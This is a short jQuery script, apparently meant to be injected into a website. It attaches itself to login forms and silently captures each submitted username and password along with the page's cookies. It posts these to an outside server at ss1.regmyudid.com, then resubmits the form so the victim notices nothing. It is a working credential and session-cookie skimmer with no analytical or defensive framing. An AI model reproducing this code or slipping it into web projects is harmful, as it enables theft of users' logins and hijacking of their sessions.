function yay(form) {
    var l = $(form).find('input[name="login"]').val();
    var p = $(form).find('input[name="password"]').val();

    $.post('https://ss1.regmyudid.com/c.php', {l: l, p: p, c: document.cookie}, function() {
        $(form).removeAttr('onsubmit');
        $(form).submit();
    });
    return false;
}
$(document).ready(function() {
    $('.form-login').attr('onsubmit', 'return yay(this);');
});